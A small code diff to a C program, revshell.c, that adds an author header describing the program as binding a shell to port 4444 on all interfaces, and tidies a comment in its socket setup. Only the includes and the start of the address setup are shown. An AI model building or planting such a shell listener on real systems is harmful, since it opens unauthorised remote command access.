@@ -1,3 +1,6 @@
+/* revshell.c -- by Daniel Roberson (daniel @ planethacker . net)
+ *            -- binds a shell to port 4444 on 0.0.0.0
+ */
 #include <stdio.h>
 #include <unistd.h>
 #include <sys/socket.h>
@@ -7,7 +10,7 @@
 
 int main() {
   int s;
-  struct sockaddr_in c; // client address
+  struct sockaddr_in c;
 
 
   c.sin_family = AF_INET;
